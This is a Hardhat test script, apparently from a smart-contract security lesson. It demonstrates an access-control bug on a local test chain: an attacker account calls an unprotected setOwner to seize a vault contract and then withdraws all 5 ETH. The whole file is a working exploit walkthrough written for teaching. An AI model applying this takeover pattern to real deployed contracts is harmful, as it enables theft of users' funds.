const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("4.2 Access Control Vulnerability Attack", function () {
  it("attacker should take over owner and withdraw all funds", async function () {
    const [deployer, attacker] = await ethers.getSigners();

    const Vuln = await ethers.getContractFactory("AccessControlVuln", deployer);
    const vault = await Vuln.deploy();
    await vault.waitForDeployment();

    // 给合约打 5 ETH（模拟资金池）
    await deployer.sendTransaction({
      to: await vault.getAddress(),
      value: ethers.parseEther("5"),
    });

    const before = await ethers.provider.getBalance(await vault.getAddress());
    console.log("Vault ETH before:", ethers.formatEther(before));
    console.log("Owner before:", await vault.owner());

    // 攻击：越权接管 owner
    await vault.connect(attacker).setOwner(attacker.address);
    console.log("Owner after:", await vault.owner());

    // 攻击：以 owner 身份提走全部资金
    await vault.connect(attacker).withdrawAll();

    const after = await ethers.provider.getBalance(await vault.getAddress());
    console.log("Vault ETH after:", ethers.formatEther(after));

    expect(after).to.equal(0n);
  });
});
